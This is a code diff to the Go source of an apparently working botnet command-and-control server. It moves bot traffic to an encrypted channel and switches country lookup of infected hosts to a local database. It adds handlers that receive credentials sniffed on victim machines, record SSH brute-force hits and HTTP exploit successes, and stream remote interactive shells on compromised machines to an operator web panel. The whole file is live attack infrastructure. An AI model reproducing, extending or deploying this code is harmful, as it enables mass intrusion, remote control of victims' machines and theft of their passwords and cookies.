@@ -8,13 +8,13 @@ import (
 	"encoding/binary"
 	"encoding/json"
 	"fmt"
-	"io"
 	"math/rand"
 	"net"
-	"net/http"
 	"strings"
 	"sync"
 	"time"
+
+	"github.com/oschwald/maxminddb-golang"
 )
 
 // ============================================================================
@@ -251,8 +251,8 @@ func init() {
 }
 
 // ============================================================================
-// VPE2 TRANSPORT
-// Bot-to-CNC communication uses VPE2 (ChaCha20 + X25519 + HMAC-SHA256 over raw TCP).
+// EZF3 TRANSPORT
+// Bot-to-CNC communication uses EZF3 (ChaCha20 + X25519 + HMAC-SHA256 over raw TCP).
 // ============================================================================
 
 // ============================================================================
@@ -297,21 +297,34 @@ func randomChallenge(length int) string {
 
 // ============================================================================
 // GEOIP LOOKUP
-// Uses ip-api.com free API to resolve country from bot IP address.
-// Falls back to "??" on error. Caches nothing (one lookup per bot connect).
+// Uses local MaxMind GeoLite2-Country mmdb database.
+// Falls back to "??" if the database file is missing or lookup fails.
 // ============================================================================
 
-// geoIPResponse holds the JSON response from ip-api.com
-type geoIPResponse struct {
-	Status      string `json:"status"`
-	Country     string `json:"country"`
-	CountryCode string `json:"countryCode"`
-	City        string `json:"city"`
-	ISP         string `json:"isp"`
+// geoReader is the cached mmdb reader (nil = not loaded / not available)
+var (
+	geoReader     *maxminddb.Reader
+	geoReaderOnce sync.Once
+)
+
+// openGeoReader opens db/GeoLite2-Country.mmdb once.
+func openGeoReader() {
+	r, err := maxminddb.Open("db/GeoLite2-Country.mmdb")
+	if err != nil {
+		logMsg("[GEO] mmdb not available (place GeoLite2-Country.mmdb in db/): %v", err)
+		return
+	}
+	geoReader = r
+}
+
+// geoCountry is the minimal struct to pull country ISO code from the mmdb.
+type geoCountry struct {
+	Country struct {
+		ISOCode string `maxminddb:"iso_code"`
+	} `maxminddb:"country"`
 }
 
 // lookupGeoIP resolves country code from an IP:port address string.
-// Uses ip-api.com free tier (45 req/min, no key needed).
 // Returns 2-letter country code (e.g., "US", "DE") or "??" on failure.
 func lookupGeoIP(remoteAddr string) string {
 	// Extract IP from IP:port
@@ -326,30 +339,24 @@ func lookupGeoIP(remoteAddr string) string {
 		return "LO"
 	}
 
-	client := &http.Client{Timeout: 5 * time.Second}
-	resp, err := client.Get(fmt.Sprintf("http://ip-api.com/json/%s?fields=status,countryCode,country,city,isp", host))
-	if err != nil {
+	geoReaderOnce.Do(openGeoReader)
+	if geoReader == nil {
+		return "??"
+	}
+
+	var result geoCountry
+	if err := geoReader.Lookup(ip, &result); err != nil {
 		logMsg("[GEO] Lookup failed for %s: %v", host, err)
 		return "??"
 	}
-	defer resp.Body.Close()
 
-	body, err := io.ReadAll(resp.Body)
-	if err != nil {
+	code := result.Country.ISOCode
+	if code == "" {
 		return "??"
 	}
 
-	var geo geoIPResponse
-	if err := json.Unmarshal(body, &geo); err != nil {
-		return "??"
-	}
-
-	if geo.Status != "success" {
-		return "??"
-	}
-
-	logMsg("[GEO] %s -> %s (%s, %s - %s)", host, geo.CountryCode, geo.Country, geo.City, geo.ISP)
-	return geo.CountryCode
+	logMsg("[GEO] %s -> %s", host, code)
+	return code
 }
 
 // ============================================================================
@@ -364,7 +371,7 @@ func lookupGeoIP(remoteAddr string) string {
 // Stores bot metadata: connection socket, unique ID, architecture, RAM, CPU, timestamps
 // Uses mutex locking for thread-safe map access (multiple bots connect concurrently)
 // Maintains both new map-based storage and legacy slice for backwards compatibility
-func addBotConnection(conn net.Conn, botID string, arch string, ram int64, cpuCores int, processName string, origin string, country string, hasScanner bool, hasAttack bool) {
+func addBotConnection(conn *CipherConn, botID string, arch string, ram int64, cpuCores int, processName string, origin string, country string, hasScanner bool, hasAttack bool) {
 	botConnsLock.Lock()
 	defer botConnsLock.Unlock()
 
@@ -550,8 +557,7 @@ func kickBot(botID string) {
 		return
 	}
 	// Send !exit — lightweight process kill, persistence stays intact
-	bc.conn.Write([]byte("!exit\n"))
-	// Close the socket and remove from map so the slot is free
+	bc.conn.WriteFrame([]byte("!exit\n")) //nolint:errcheck
 	bc.conn.Close()
 	delete(botConnections, botID)
 	botCount--
@@ -588,7 +594,8 @@ func kickBot(botID string) {
 // Implements the full authentication handshake protocol
 // Routes shell command output back to the user who issued the command
 // Handles Base64-encoded output for binary-safe transmission
-func handleBotConnection(conn net.Conn) {
+func handleBotConnection(cc *CipherConn) {
+	conn := cc // net.Conn interface for Close/deadline calls
 	// Extract IP for rate limiting (strip port)
 	remoteIP := conn.RemoteAddr().String()
 	if host, _, err := net.SplitHostPort(remoteIP); err == nil {
@@ -641,7 +648,7 @@ func handleBotConnection(conn net.Conn) {
 		botConnsLock.Lock()
 		var disconnectedID, disconnectedArch string
 		for botID, botConn := range botConnections {
-			if botConn.conn == conn {
+			if botConn.conn == cc {
 				disconnectedID = botID
 				disconnectedArch = botConn.arch
 				delete(botConnections, botID)
@@ -666,62 +673,51 @@ func handleBotConnection(conn net.Conn) {
 		conn.Close()
 	}()
 
-	reader := bufio.NewReader(conn)
-	writer := bufio.NewWriter(conn)
-
 	// Step 1: Send authentication challenge
 	challenge := randomChallenge(32)
-	if _, err := writer.WriteString(fmt.Sprintf("AUTH_CHALLENGE:%s\n", challenge)); err != nil {
+	if err := cc.WriteFrame([]byte(fmt.Sprintf("AUTH_CHALLENGE:%s\n", challenge))); err != nil {
 		return
 	}
-	writer.Flush()
-
-	// challenge sent
 
 	// Check if IP got blocked while sending challenge
 	if authIsBlocked(remoteIP) {
 		logMsg("[BLOCKED] IP %s blocked after sending challenge", remoteIP)
-		conn.Write([]byte("RATE_LIMITED\n"))
+		cc.WriteFrame([]byte("RATE_LIMITED\n")) //nolint:errcheck
 		conn.Close()
 		return
 	}
 
-	// Step 2: Read bot's response with proper timeout and block checking
+	// Step 2: Read bot's response
 	conn.SetReadDeadline(time.Now().Add(15 * time.Second))
 
-	// Create channels for async read
 	authRespChan := make(chan string, 1)
 	authErrChan := make(chan error, 1)
 
 	go func() {
-		authResponse, err := reader.ReadString('\n')
+		payload, err := cc.ReadFrame()
 		if err != nil {
 			authErrChan <- err
 			return
 		}
-		authRespChan <- strings.TrimSpace(authResponse)
+		authRespChan <- strings.TrimSpace(string(payload))
 	}()
 
-	// Wait for response, error, or timeout
 	var authResponse string
 	var err error
 	select {
 	case authResponse = <-authRespChan:
-		// Got response, continue
 	case err = <-authErrChan:
-		// Read error occurred
+		_ = err
 		authRecordFail(remoteIP)
 		return
 	case <-time.After(15 * time.Second):
-		// Timeout
 		authRecordFail(remoteIP)
 		return
 	}
 
-	// CRITICAL: Check if IP became blocked while we were waiting for response
 	if authIsBlocked(remoteIP) {
 		logMsg("[BLOCKED] IP %s blocked during auth handshake", remoteIP)
-		conn.Write([]byte("RATE_LIMITED\n"))
+		cc.WriteFrame([]byte("RATE_LIMITED\n")) //nolint:errcheck
 		conn.Close()
 		return
 	}
@@ -736,51 +732,46 @@ func handleBotConnection(conn net.Conn) {
 			safeSubstring(expectedResponse, 0, 10))
 		if blocked {
 			logMsg("[RATELIMIT] Rate-limited %s after %d failures", remoteIP, authMaxFails)
-			writer.WriteString("RATE_LIMITED\n")
-			writer.Flush()
+			cc.WriteFrame([]byte("RATE_LIMITED\n")) //nolint:errcheck
 		} else {
-			writer.WriteString("AUTH_FAILED\n")
-			writer.Flush()
+			cc.WriteFrame([]byte("AUTH_FAILED\n")) //nolint:errcheck
 		}
 		return
 	}
 
-	// Check again before sending success (in case IP was blacklisted during verification)
 	if authIsBlocked(remoteIP) {
 		logMsg("[BLOCKED] IP %s blocked during verification", remoteIP)
-		conn.Write([]byte("RATE_LIMITED\n"))
+		cc.WriteFrame([]byte("RATE_LIMITED\n")) //nolint:errcheck
 		conn.Close()
 		return
 	}
 
-	// Step 4: Send success — clear any previous failures for this IP
+	// Step 4: Send success
 	authRecordSuccess(remoteIP)
-	writer.WriteString("AUTH_SUCCESS\n")
-	writer.Flush()
+	if err := cc.WriteFrame([]byte("AUTH_SUCCESS\n")); err != nil {
+		return
+	}
 
 	logMsg("[AUTH] Authentication successful for %s", conn.RemoteAddr())
 
 	// Step 5: Wait for bot registration
 	conn.SetReadDeadline(time.Now().Add(25 * time.Second))
 
-	// Create channels for async registration read
 	regRespChan := make(chan string, 1)
 	regErrChan := make(chan error, 1)
 
 	go func() {
-		registerMsg, err := reader.ReadString('\n')
+		payload, err := cc.ReadFrame()
 		if err != nil {
 			regErrChan <- err
 			return
 		}
-		regRespChan <- strings.TrimSpace(registerMsg)
+		regRespChan <- strings.TrimSpace(string(payload))
 	}()
 
-	// Wait for registration
 	var registerMsg string
 	select {
 	case registerMsg = <-regRespChan:
-		// Got registration
 	case err = <-regErrChan:
 		logMsg("[AUTH] Failed to read registration from %s: %v", conn.RemoteAddr(), err)
 		return
@@ -863,16 +854,15 @@ func handleBotConnection(conn net.Conn) {
 	}
 
 	// Add bot to connections
-	addBotConnection(conn, botID, arch, ram, cpuCores, processName, origin, country, hasScanner, hasAttack)
+	addBotConnection(cc, botID, arch, ram, cpuCores, processName, origin, country, hasScanner, hasAttack)
 
 	// Reset deadline for normal operation
 	conn.SetDeadline(time.Time{})
 
 	// Send first PING immediately on registration
-	conn.Write([]byte("PING\n"))
+	cc.WriteFrame([]byte("PING\n")) //nolint:errcheck
 
-	// Ping goroutine: sends PING every 16-40s (jittered) directly on conn
-	// CipherConn.Write is mutex-protected so this is safe alongside the main loop
+	// Ping goroutine
 	stopPing := make(chan struct{})
 	defer close(stopPing)
 	go func() {
@@ -880,11 +870,10 @@ func handleBotConnection(conn net.Conn) {
 			delay := time.Duration(16+rand.Intn(25)) * time.Second
 			select {
 			case <-time.After(delay):
-				// Check if bot is still connected and IP isn't blocked
 				if authIsBlocked(remoteIP) {
 					return
 				}
-				if _, err := conn.Write([]byte("PING\n")); err != nil {
+				if err := cc.WriteFrame([]byte("PING\n")); err != nil {
 					return
 				}
 			case <-stopPing:
@@ -893,22 +882,16 @@ func handleBotConnection(conn net.Conn) {
 		}
 	}()
 
-	// Main read loop — read deadline 120s (dead timeout)
-	// If nothing at all comes in 120s the bot is dead
-	// PINGs are sent independently every 16-40s so PONGs should arrive well within this window
 	deadTimeout := BotHeartbeatTimeout
 
 	for {
 		conn.SetReadDeadline(time.Now().Add(deadTimeout))
-		line, err := reader.ReadString('\n')
+		payload, err := cc.ReadFrame()
 		if err != nil {
-			if netErr, ok := err.(net.Error); ok && netErr.Timeout() {
-				// Timeout is normal, just break
-			}
 			break
 		}
 
-		line = strings.TrimSpace(line)
+		line := strings.TrimSpace(string(payload))
 
 		// Any data from bot = bot is alive — update lastPing for cleanup scanner + web panel
 		botConnsLock.Lock()
@@ -1015,6 +998,31 @@ func handleBotConnection(conn net.Conn) {
 			continue
 		}
 
+		// Sniffer stats — lightweight counters from child process pipe
+		if strings.HasPrefix(line, "SNIFF|") {
+			sniffJSON, _ := json.Marshal(map[string]string{
+				"botID": botID,
+				"raw":   line,
+			})
+			broadcastSSE("sniff_stats", string(sniffJSON))
+			continue
+		}
+
+		// Sniffer hit — actual credential data exfiltrated from bot
+		// Format: SNIFF_HIT|type|src_ip|dst_ip:port|user|pass
+		if strings.HasPrefix(line, "SNIFF_HIT|") {
+			parts := strings.SplitN(line, "|", 6)
+			if len(parts) >= 6 {
+				sniffType := parts[1] // post, basic, cookie, url
+				srcIP := parts[2]
+				// parts[3] is dst_ip:port — use srcIP for recording
+				user := parts[4]
+				pass := parts[5]
+				RecordSniffHit(srcIP, sniffType, user, pass, botID)
+			}
+			continue
+		}
+
 		// Check if a preview collector is waiting for this bot's output
 		previewCollectorsLock.Lock()
 		if ch, ok := previewCollectors[botID]; ok {
@@ -1038,8 +1046,74 @@ func handleBotConnection(conn net.Conn) {
 			userConn.Write([]byte(fmt.Sprintf("[Bot: %s] %s\r\n", botID, line)))
 		}
 
-		// Forward to web shell connections
-		forwardBotOutputToWebShells(botID, line)
+		// Forward to web shell connections — detect PTY and streaming protocol lines
+		if strings.HasPrefix(line, "PTY_DATA ") {
+			// Raw PTY output — forward binary data after prefix
+			raw := line[9:] // skip "PTY_DATA "
+			sendWebShellStreamMsg(botID, map[string]interface{}{
+				"type": "pty_output", "botID": botID, "data": raw,
+			})
+			continue
+		} else if line == "PTY_OPENED" {
+			sendWebShellStreamMsg(botID, map[string]interface{}{
+				"type": "pty_opened", "botID": botID,
+			})
+			continue
+		} else if line == "PTY_CLOSED" {
+			sendWebShellStreamMsg(botID, map[string]interface{}{
+				"type": "pty_closed", "botID": botID,
+			})
+			continue
+		} else if line == "PTY_ALREADY_OPEN" {
+			sendWebShellStreamMsg(botID, map[string]interface{}{
+				"type": "pty_opened", "botID": botID,
+			})
+			continue
+		} else if strings.HasPrefix(line, "PTY_ERROR ") {
+			sendWebShellStreamMsg(botID, map[string]interface{}{
+				"type": "pty_error", "botID": botID,
+				"error": strings.TrimPrefix(line, "PTY_ERROR "),
+			})
+			continue
+		}
+
+		if strings.HasPrefix(line, "STDOUT ") {
+			text := strings.TrimPrefix(line, "STDOUT ")
+			// Forward to TUI
+			if tuiMode && tuiProgram != nil {
+				tuiProgram.Send(ShellOutputMsg{BotID: botID, Output: text + "\n"})
+			}
+			sendWebShellStreamMsg(botID, map[string]interface{}{
+				"type": "stream_stdout", "botID": botID, "output": text + "\n",
+			})
+		} else if strings.HasPrefix(line, "STDERR ") {
+			text := strings.TrimPrefix(line, "STDERR ")
+			if tuiMode && tuiProgram != nil {
+				tuiProgram.Send(ShellOutputMsg{BotID: botID, Output: text + "\n"})
+			}
+			sendWebShellStreamMsg(botID, map[string]interface{}{
+				"type": "stream_stderr", "botID": botID, "output": text + "\n",
+			})
+		} else if line == "EXIT_OK command completed successfully" {
+			sendWebShellStreamMsg(botID, map[string]interface{}{
+				"type": "stream_done", "botID": botID, "exitCode": 0,
+			})
+		} else if strings.HasPrefix(line, "EXIT_ERR ") {
+			errMsg := strings.TrimPrefix(line, "EXIT_ERR ")
+			if tuiMode && tuiProgram != nil {
+				tuiProgram.Send(ShellOutputMsg{BotID: botID, Output: "[" + errMsg + "]\n"})
+			}
+			sendWebShellStreamMsg(botID, map[string]interface{}{
+				"type": "stream_done", "botID": botID, "exitCode": 1,
+				"error": errMsg,
+			})
+		} else if line == "[stream] output:" {
+			sendWebShellStreamMsg(botID, map[string]interface{}{
+				"type": "stream_start", "botID": botID,
+			})
+		} else {
+			forwardBotOutputToWebShells(botID, line)
+		}
 	}
 }
 
@@ -1087,7 +1161,7 @@ func parseScanReport(botID string, data []byte) {
 				break
 			}
 			pass := string(p[5+ulen+1 : 5+ulen+1+plenv])
-			RecordSSHHit(ip, user, pass)
+			RecordSSHHitNew(ip, user, pass, botID)
 			ReportTarget(ip, TargetHit, user+":"+pass)
 
 		case srSSHDeployed:
@@ -1121,11 +1195,6 @@ func parseScanReport(botID string, data []byte) {
 			honeypots := binary.BigEndian.Uint16(p[6:8])
 			hpotsProbe := binary.BigEndian.Uint16(p[8:10])
 
-			sshLock.Lock()
-			sshLastActive = time.Now()
-			delete(sshScanningBots, botID)
-			sshLock.Unlock()
-
 			FlushBotResults(botID)
 			PushActivity("scan", fmt.Sprintf("SSH complete on %s: %d targets (skip=%d hp=%d hp_probe=%d)",
 				botID, total, skipped, honeypots, hpotsProbe))
@@ -1138,7 +1207,7 @@ func parseScanReport(botID string, data []byte) {
 			ip := net.IP(p[0:4]).String()
 			status := binary.BigEndian.Uint16(p[4:6])
 			statusStr := fmt.Sprintf("%d", status)
-			RecordHTTPExploitHit(ip, statusStr)
+			RecordHTTPExploitHitNew(ip, statusStr, botID)
 			ReportTarget(ip, TargetHit, statusStr)
 
 		case srHTTPDone:
